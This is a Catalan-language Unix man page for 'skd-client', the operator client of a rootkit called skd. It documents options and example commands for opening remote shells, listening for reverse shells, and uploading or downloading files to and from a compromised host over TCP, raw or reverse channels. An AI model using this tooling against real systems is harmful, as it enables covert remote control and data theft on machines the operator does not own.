.TH SKD-CLIENT 1

.SH NOM
skd-client - client per gestionar el rootkit skd

.SH SINOPSIS

.B skd-client -a 
.RI { shell | down | up | check | listen } 
.B -c 
.RI { tcp | raw | rev } 
.B -h 
.I hostname 
.B -l 
.I port 
.B -d 
.I port 
.RB [ -f 
.IR file ] 
.RB [ -t 
.IR secs ]

.SH OPCIONS

.TP
.B -a
.RI { shell | down | up | check | listen }
.RS
.PP
Aquesta opció ens permet seleccionar l'opció a executar. Les diferents opcions disponibles són: shell, down, up check i listen.
.PP
.IR shell :
aquesta acció ens permet obtenir una shell lligada a un TTY a la màquina remota on s'està executant el launcher.
.PP
.IR up :
aquesta acció ens permet pujar un fitxer a la màquina remota. El fitxer pujat, serà guardat en el directori HOME de l'usuari.
.PP
.IR down :
aquesta acció ens permet descarregar una fitxer del disc dur de la màquina remota. Per tal de descarregar-lo, cal especificar el path complet on es troba el fitxer.
.PP
.IR check :
aquesta acció ens permet comprovar si hi ha una instància del launcher en execució a l'altre màquina.
.PP
.IR listen :
aquesta acció queda escoltant a un port TCP a l'espera que el launcher li estableixi una connexió, i així 
acabar llançant una shell.
.RE

." -c option
.TP
.B -c
.RI { tcp | raw | rev }
.RS
.PP
Aquesta opció ens permet definir el mode de comunicació que s'utilitzarà a l'hora de realitzar l'acció especificada amb el parametre -a. Tots els modes de comunicació requereixen de la utilització del paràmetre -h. Els diferents valors possibles són:
.PP
.IR tcp :
aquest mode de comunicació és el què s'utilitza quan el launcher està en execució en un entorn no privilegiat. Tracta en establir una connexió tcp directament amb el launcher i comunicar-se per aquí. Aquest mode requereix a més, de la utilització del paràmetre -d.

.PP
.IR raw :
aquest mode de comunicació, estableix una connexió utilitzant un protocol propi. Per tal d'utilitzar aquest mode, tant el launcher com el client han de ser executats com a usuari root. Aquest mode també requereix dels paràmetres -d i -l.

.PP
.IR rev :
aquest mode de comunicació, estableix una connexió a un port ja obert a la màquina on hi ha el launcher, i després espera que aquesta estableixi una connexió cap a ell. Per tal de fer això, requereix dels paràmetres -d i -l.
.RE

.TP
.BR -h :
.IR hostname .
Aquesta opció especifica amb el què es vol contactar. El paràmetre
.I hostname
pot ser una direcció ip o un nom DNS.

.TP
.BR -l :
.IR port .
En aquesta opció, port és el port local de la màquina que el client utilitzarà per el mode de comunicació
en qüestió. 

.TP
.BR -d :
.IR port .
En aquesta opció, port és el port destí utilitzat per el mode de comunicació. Normalment serà el port utilitzat on enviar les dades.

.TP
.BR -f :
.IR file .
En les accions on calgui especificar un fitxer (ja sigui per pujar o per descarregar), s'utilitzarà aquesta opció per a definir-lo.

.TP
.BR -t :
.IR sec .
Opció utilitzada per a definir un timeout en l'establiment de la connexió entre el client i el launcher. El temps per defecte és de 10 segons.

.SH DISPONIBILITAT

Totes les variants de UNIX que compleixin l'estàndard POSIX.

.SH DESCRIPCIÓ

skd-client ens permet utilitzar les diferents funcionalitats del rootkit skd. Amb aquest client ens podem
connectar a la part launcher utilitzant els diferents modes de comunicació, així com executar les diferents accions disponibles. 
.PP
En el moment en què el skd-client és executat, aquest sol·licita un password que serà utilitzat per a autenticar i xifrar la connexió amb el launcher. 

.SH EXEMPLES
.B skd-client -a shell -c tcp -h 127.0.0.1 -d 9999
.PP
Estableix una connexió TCP amb el host 127.0.0.1 al port 9999, i sol·licita l'execució d'una shell. Al fer-ho, la pròpia connexió, passa a ser la connexió establerta amb la shell.

.B skd-client -a shell -c raw -h localhost -d 9999 -l 8888 -t 3
.PP
Estableix una connexió RAW amb el host localhost utilitzant els ports 9999 i 8888. Al fer-ho defineix un timeout de 3 segons. D'aquesta connexió, també s'obté una shell.

.B skd-client -a listen -l 8888
.PP
Obre el port TCP 8888, i espera rebre una connexió en aquest port infinitament. Si la rep, aquesta connexió
esdevé amb una shell.

.B skd-client -a up -c rev -h 127.0.0.1 -d 80 -l 8888 -f data.zip
.PP
Estableix una connexió TCP amb el port 80 del host 127.0.0.1 i envia un paquet especial de tal manera que llavors el launcher estableix una connexió al port local 8888. Al rebre la connexió del launcher, s'inicia 
una transferència del fitxer data.zip que serà guardat en el home utilitzat pel launcher.

.B skd-client -a down -c rev -h 127.0.0.1 -d 80 -l 8888 -f /var/tmp/file.zip
.PP
Segueix exactament els mateixos passos que en el cas anterior, però en aquest cas, sol·licita la descàrrega del fitxer /var/tmp/file.zip. Aquest fitxer és descarregat en el directori on estiguem en el moment d'executar la comanda.

.B skd-client -a check -c rev -h 127.0.0.1 -d 80 -l 8888
.PP
Estableix una connexió TCP igual que en els exemples anteriors. En aquest cas el paquet que envia no està xifrat. En cas de ser contestat, el skd-client mostrarà un missatge indicant que s'ha trobat un launcher en el host objectiu.

.SH AUTOR

Albert Sellarès <whats[@t]wekk.net>

.SH VEURE TAMBÉ
.RS
skd-launcher(1), skd-config(7).
.RE
